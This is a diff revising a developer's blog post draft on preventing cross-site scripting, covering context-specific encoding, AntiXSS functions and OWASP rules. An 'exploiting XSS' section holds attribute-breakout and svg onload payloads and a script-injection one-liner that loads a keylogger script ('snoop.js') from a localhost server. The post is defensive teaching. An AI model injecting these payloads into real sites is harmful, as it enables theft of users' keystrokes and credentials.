@@ -29,40 +29,70 @@ content.
 {: .alert.alert-warning }
 
 Even though the move to modern development frameworks such as .NET, which provide automatic protection against this
-vulnerability amongst others, has removed a lot of the onus on developers to understand its technical detail, lack of
-understanding of security flaws and the increase in client side code are two areas that IMO continues to keep XSS at
-the top of the security flaws list.
+vulnerability amongst others, has removed a lot of the onus on developers to understand its technical detail, it is
+this very lack of deep understanding of security flaws and the increase in client side code are two areas that
+continue to keep XSS at the top of the security flaws list.
 
 > It is a technical debt that you will have to pay sooner or later.
 
 Whilst tasked to fix XSS security holes in a legacy application that I was supporting, the exercise was so
-daunting and time consuming that it made me firm up my belief that security indeed needs to be taken very seriously.
-It is a technical debt that you will have to pay sooner or later.
+daunting and time consuming that it made me firm up my belief that security indeed needs to be taken **very**
+seriously. It is a technical debt that you will have to pay sooner or later.
 
 There are automated tools that can find and identify XSS problems automatically. However because every application
-builds output pages differently &mdash; with a mixture of server and client side &mdash; automated detection has
+builds output pages differently --- with a mixture of server and client side --- automated detection has
 become very difficult. It is only with code review (requiring strong implementation awareness) and laborious manual
 regression testing that a level of near complete coverage can be achieved.
 
-So don't let things slip this far in your current development. **Update your project's [DoD][7]** and add specific
-references to security as a first step.
+So don't let things slip this far in your current development. **Update your project's [DoD][7] and add specific
+references to security** as a first step.
 
-In the mean time, I share with you 5 key takeaways from my sprint of learning to comprehensively prevent XSS
-taking place on your site.
+In the mean time, to get up to speed with the topic, I share with you 5 key learnings that I took away from my
+security pruning exercise to to comprehensively prevent XSS taking place on your site.
 
 ## 1. Encoding
-Input is left as is, and not santized. For a system that already exists in Production, think about the content
-that has already been entered by users already.
+User input is typically *not* sanitized in many systems and is left as is. However, anytime untrusted user input is
+rendered in any *presentation form*, it **must** be encoded accordingly.
 
+**Encoding** is the escaping of raw text with HTML entity encoding to prevent switching to any execution content. The 5
+notorious characters that you normally pay particular attention to are `& < > " '` which need to be **encoded**
+as `&amp; &lt; &gt; &quote; &#x27 &#x2F;` in output accordingly.
+{: .alert.alert-warning }
 
-* Different encoding types exist
-* Attribute encoding, Content encoding
+Meaning, that **you MUST escape the untrusted user data with the appropriate type of encoding depending on the part
+of HTML document you're putting it into**.
 
-> But HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event
-handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method
-everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML
-document you're putting untrusted data into. That's what the rules below are all about.
-https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
+To help you appreciate the concept of context and different encoding functions, see the following table lists some of
+the various HTML document locations that untrusted data can be rendered in and references to the different types of
+encoding functions that exist in a security encoding library such as Microsoft's [AntiXSS][9].
+
+Context | Encoding function |
+--------|:------------------|
+HTML Body | [`HtmlEncode`][10]
+HTML Attribute | [`HtmlAttributeEncode`][11]
+URL in SRC or HREF attribute | [`UrlEncode`][12]
+Query Parameter | [`UrlPathEncode`][15]
+JavaScript Value | [`JavaScriptStringEncode`][13]
+CSS Value | [`CssEncode`][14]
+
+### Can I insert untrusted data in any location?
+**NO**.
+
+As OWASP strongly [recommends][8], you should by default **deny all** untrusted data from being rendered in your
+HTML document except for areas such as what was mentioned above that uses the right type of encoding. In particular,
+they highlight some clear cases which you should never go near unless you really know what you are doing:
+
+{% highlight html %}
+<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
+
+<!-- ...NEVER PUT UNTRUSTED DATA HERE... -->           inside an HTML comment
+
+<div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
+
+<NEVER PUT UNTRUSTED DATA HERE... href="/test" />      in a tag name
+
+<style>...NEVER PUT UNTRUSTED DATA HERE...</style>    directly in CSS
+{% endhighlight %}
 
 ## 2. Locator Strings
 
@@ -95,37 +125,31 @@ validate the length, characters, format, and business rules on that data before 
 
 ```
 
-## 4. E
-// 4 - How to exploit a XSS vulnerable site
-* Using <svg onload="..." />
-* Using <img onload="..." />
+## 4. Exploiting XSS
+* Using `<svg onload="..." />`
+* Using `<img onload="..." />`
 * Passing in query string
 * Using bit.ly to obfuscate a URL, or HTML encoding - its getting easy to get users to click on malciious links because of url shorterning
 * Breaking the code
 
-```
+
+
+## 5. Implementation Awareness
+{% highlight javascript %}
 function escape(input) {
     return '<input type="text" value="' + input + '">';
 }
-```
+{% endhighlight %}
 
-```
+
+~~~
 "><svg onload="alert('hello world');">
-```
-
-// 5 Context
+~~~
 
 
 
 
-Character | HTML Encoding |
-----------|:--------------|
-& | `&amp;`
-< | `&lt;`
-> | `&gt;`
-" | `&quote;`
-' | `&#x27`
-/ | `&#x2F;`
+
 
 
 
@@ -157,28 +181,31 @@ Ref: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 
 Some sites will prevent any `<script>` tags to be embedded or posted in their input fields. In that case, you
 could try to embed and run xss-keylogger client side script as part of the `onload` attribute of an `svg` element.
-```
-<svg onload="http://localhost:3000/snoop.js" />
+
+`<svg onload="http://localhost:3000/snoop.js" />`
 
 
+{% highlight javascript %}
 var d=document;var s=d.createElement('script');s.type='text/javascript';s.src='http://localhost:3000/snoop.js';var h=d.getElementsByTagName('head')[0];h.appendChild(s);
+{% endhighlight %}
 
+{% highlight javascript %}
 function loadScript(url, callback) {
-        // Adding the script tag to the head as suggested before
-        var head = document.getElementsByTagName('head')[0];
-        var script = document.createElement('script');
-        script.type = 'text/javascript';
-        script.src = url;
+    // Adding the script tag to the head as suggested before
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = url;
 
-        // Then bind the event to the callback function.
-        // There are several events for cross browser compatibility.
-        script.onreadystatechange = callback;
-        script.onload = callback;
+    // Then bind the event to the callback function.
+    // There are several events for cross browser compatibility.
+    script.onreadystatechange = callback;
+    script.onload = callback;
 
-        // Fire the loading
-        head.appendChild(script);
-    }
-```
+    // Fire the loading
+    head.appendChild(script);
+}
+{% endhighlight %}
 
 ## How to get it right
 To improve my own knowledge on this domain, I thought I'd try and learn how to hack. It turned out to be a lot of
@@ -205,3 +232,11 @@ just behind Information Leakage (55%).
 [5]: http://en.wikipedia.org/wiki/Cross-site_scripting
 [6]: https://www.owasp.org/index.php/About_OWASP
 [7]: https://www.scrum.org/Resources/Scrum-Glossary/Definition-of-Done
+[8]: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#RULE_.230_-_Never_Insert_Untrusted_Data_Except_in_Allowed_Locations
+[9]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder(v=vs.110).aspx
+[10]: http://msdn.microsoft.com/en-us/library/hh244070(v=vs.110).aspx
+[11]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder.htmlattributeencode(v=vs.110).aspx
+[12]: http://msdn.microsoft.com/en-us/library/hh244091(v=vs.110).aspx
+[13]: http://msdn.microsoft.com/en-us/library/system.web.util.httpencoder.javascriptstringencode(v=vs.110).aspx
+[14]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder.cssencode(v=vs.110).aspx
+[15]: http://msdn.microsoft.com/en-us/library/system.web.security.antixss.antixssencoder.urlpathencode(v=vs.110).aspx
